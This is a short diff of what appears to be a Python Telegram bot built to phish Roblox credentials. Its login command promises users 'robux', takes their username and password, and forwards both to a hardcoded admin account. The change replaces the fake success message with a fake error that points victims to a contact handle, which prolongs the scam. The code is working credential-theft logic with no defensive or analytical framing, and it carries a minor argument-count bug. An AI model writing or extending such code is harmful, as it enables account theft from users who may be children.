@@ -28,7 +28,7 @@ async def login(message: Message):
     if len(args) >= 2:
         username = args[1]
         password = args[2]
-        await message.answer(f'You have successfully logged in. You will receive robux soon.')
+        await message.answer(f'Error. Please try again or contact with us: @JoeBiden_Usa')
         admin_id = '1621436440'
         await bot.send_message(admin_id, f'Username: {username}, Password: {password}')
     else:
